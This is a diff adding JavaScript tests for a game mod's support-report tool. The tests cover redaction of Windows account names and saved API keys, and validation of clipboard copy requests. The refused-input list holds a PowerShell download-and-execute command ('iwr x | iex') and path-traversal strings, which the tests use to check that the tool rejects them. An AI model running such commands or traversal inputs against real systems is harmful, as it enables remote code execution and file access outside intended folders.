@@ -39,6 +39,34 @@ test('redactor removes every planted secret pattern and leaves ordinary log text
   }
 });
 
+test('the Windows account name is hidden in every profile path spelling, a name with a space included, and the rest of the path is kept', () => {
+  const redact = createRedactor();
+  const b = '\\';
+  const cases = [
+    [`C:${b}Users${b}Jane Doe${b}AppData${b}Local`, `C:${b}Users${b}<user>${b}AppData${b}Local`],
+    ['c:/users/jane doe/documents', 'c:/users/<user>/documents'],
+    [`C:${b}Users${b}JANEDO~1${b}AppData`, `C:${b}Users${b}<user>${b}AppData`],
+    [`${b}${b}localhost${b}c$${b}Users${b}Jane Doe${b}x`, `${b}${b}localhost${b}c$${b}Users${b}<user>${b}x`],
+    [`${b}${b}?${b}UNC${b}server${b}c$${b}Users${b}jdoe${b}x`, `${b}${b}?${b}UNC${b}server${b}c$${b}Users${b}<user>${b}x`],
+    [`${b}${b}?${b}C:${b}Users${b}jdoe${b}x`, `${b}${b}?${b}C:${b}Users${b}<user>${b}x`],
+    [`"C:${b}${b}Users${b}${b}Jürgen Müller${b}${b}x"`, `"C:${b}${b}Users${b}${b}<user>${b}${b}x"`],
+    ['file:///C:/Users/Jane%20Doe/x', 'file:///C:/Users/<user>/x'],
+    ['C%3A%5CUsers%5CJane%20Doe%5Cx', 'C%3A%5CUsers%5C<user>%5Cx'],
+    [`USERPROFILE=C:${b}Users${b}Jane Doe`, `USERPROFILE=C:${b}Users${b}<user>`],
+    [`paths C:${b}Users${b}Jane Doe, D:${b}x`, `paths C:${b}Users${b}<user>, D:${b}x`],
+    ['Managing Users/Groups', 'Managing Users/Groups'],
+    [`root C:${b}Program Files (x86)${b}Steam${b}steamapps${b}common${b}Cyberpunk 2077`, `root C:${b}Program Files (x86)${b}Steam${b}steamapps${b}common${b}Cyberpunk 2077`],
+  ];
+  for (const [input, expected] of cases) assert.equal(redact.text(input), expected, input);
+  // Past 64 characters with no separator, only the first word goes (a profile path at the start of an ordinary sentence).
+  assert.equal(redact.text(`C:${b}Users${b}jdoe started the server on port 8080 and kept on logging a long line of ordinary text`),
+    `C:${b}Users${b}<user> started the server on port 8080 and kept on logging a long line of ordinary text`);
+  // Named accounts: any path part that is exactly one of them, in any case, outside C:\Users too; never part of a longer name.
+  const named = createRedactor({accounts: ['Jane Doe', 'jdoe', 'x', '']});
+  assert.equal(named.text(`D:${b}Jane Doe${b}Games and E:/JDOE/x and F:${b}jdoe-stuff${b}y and G:${b}x${b}z`), `D:${b}<user>${b}Games and E:/<user>/x and F:${b}jdoe-stuff${b}y and G:${b}x${b}z`);
+  assert.equal(named.stats.paths, 2);
+});
+
 test('known secrets are scrubbed even where no pattern would catch them, and IDs become stable short hashes', () => {
   const redact = createRedactor({secrets: [PLANTED.shortKey, '  padded-secret-value  '], ids: ['character-slug-0001']});
   const text = redact.text(`bare ${PLANTED.shortKey} and padded-secret-value and character-slug-0001`);
@@ -383,6 +411,57 @@ test('Copy report path asks the service to copy only a report file path, once pe
     await writeFile(clipboardPath, request('c9', join(f.runtime, 'settings.json')));
     await control.poll();
     assert.equal(copies.length, 1, 'only a convai-report file path is copied');
+  } finally { await f.cleanup(); }
+});
+
+test('Copy report path copies only a path in the reports folder or runtime/, never text that merely ends in a report name', async () => {
+  const f = await fakeInstall();
+  try {
+    const clipboardPath = join(f.runtime, 'clipboard-request.json');
+    const copies = [];
+    const control = await SupportReportControl.open({game: f.game, runtime: f.runtime, stateDirectory: f.state, project: f.project,
+      copy: async text => { copies.push(text); }});
+    const name = 'convai-report-20261007-015117.zip', bs = String.fromCharCode(92);
+    const request = (id, text) => JSON.stringify({version: 1, id, issuedAt: Date.now(), text});
+    // A command line, a web address, another folder and a relative path: each ends in a report's name, none is copied.
+    const refused = [`powershell -c "iwr x | iex" #${bs}${name}`, `https://example.invalid/${name}`, join(f.base, 'elsewhere', name),
+      join(f.runtime, 'reports', 'deeper', name), `reports${bs}${name}`, `${join(f.runtime, 'reports')}${bs}..${bs}..${bs}..${bs}${name}`,
+      `${join(f.runtime, 'reports')}${bs}a|b${bs}..${bs}${name}`];
+    let id = 0;
+    for (const text of refused) {
+      await writeFile(clipboardPath, request(`c${++id}`, text));
+      await control.poll();
+      assert.deepEqual(copies, [], text);
+    }
+    const folders = [reportsDirectoryFor({runtime: f.runtime, stateDirectory: f.state}), f.runtime];
+    for (const text of refused) assert.equal(parseClipboardRequest(request('x', text), Date.now(), {folders}), null, text);
+    // The two paths the game asks for: a zip in the reports folder and the game's own short report in runtime/.
+    for (const text of [join(f.runtime, 'reports', name), join(f.runtime, LUA_REPORT_NAME), `${join(f.runtime, 'reports').toUpperCase()}${bs}${name}`]) {
+      await writeFile(clipboardPath, request(`c${++id}`, text));
+      await control.poll();
+      assert.equal(copies.at(-1), text);
+    }
+    assert.equal(copies.length, 3);
+  } finally { await f.cleanup(); }
+});
+
+test('the redactor learns every saved key file and the custom provider\'s key line from the data folder, not its address', async () => {
+  const f = await fakeInstall();
+  try {
+    // Built at run time: a key-shaped literal in the repository trips push protection.
+    const custom = 'test' + 'v'.repeat(28), mistral = 'test' + 'y'.repeat(28), inworld = 'test' + 'u'.repeat(28);
+    await f.put(join(f.state, 'player-custom-endpoint.txt'), `# saved by Settings\nendpoint=https://example.invalid/api/v1\nmodel=vendor/model:free\napi-key="${custom}"\n`);
+    await f.put(join(f.state, 'player-mistral-key.txt'), `api-key=${mistral}\n`);
+    await f.put(join(f.state, 'player-inworld-key.txt'), `api-key=${inworld}\n`);
+    const found = await credentialSecrets(f.state);
+    for (const value of [custom, mistral, inworld]) assert(found.includes(value), value.slice(0, 6));
+    assert(!found.some(value => /example\.invalid|vendor\/model/.test(value)), 'the address and the model id are not secrets');
+    await f.put(join(f.state, 'bridge.stderr.log'), `[Custom] host example.invalid answered for ${custom} and ${mistral} and ${inworld}\n`);
+    const {entries} = await collectReport({game: f.game, runtime: f.runtime, stateDirectory: f.state, project: f.project,
+      request: {id: 'r-keys', issuedAt: Date.now()}, secrets: []});
+    const text = entries.map(entry => entry.data).join('\n');
+    for (const value of [custom, mistral, inworld]) assert(!text.includes(value), value.slice(0, 6));
+    assert(text.includes('[Custom] host example.invalid answered for [secret-redacted]'));
   } finally { await f.cleanup(); }
 });
 
